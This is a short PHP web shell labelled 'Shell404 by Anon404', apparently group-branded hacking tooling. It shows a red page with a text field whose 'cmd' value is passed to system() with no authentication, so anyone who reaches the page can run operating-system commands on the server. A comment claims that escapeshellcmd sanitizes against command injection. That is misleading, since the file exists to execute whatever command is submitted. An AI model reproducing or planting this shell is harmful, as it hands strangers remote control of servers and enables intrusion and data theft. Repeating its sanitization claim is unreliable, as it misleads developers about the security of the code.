<?php
        $Team = "Anon404";
        echo "<h1>Shell404 by $Team\n</h1>";

        $Person = "William Steven";
        echo "<h3>$Team by $Person\n\n</h3>";

        echo "<h3>Coming soon............</h3>";
?>

<html style="background-color: red;">
    <body>
        <form method="POST">
            <input type="text" name="cmd" style="width: 80px; height: 20px;">
            <input type="submit" value="run">
        </form>

        <?php
        if (isset($_POST['cmd'])) {
            // Sanitize the input to avoid command injection
            $cmd = escapeshellcmd($_POST['cmd']);
            // Execute the command
            echo "<pre>";
            system($cmd);
            echo "</pre>";
        }
        ?>
    </body>
</html>
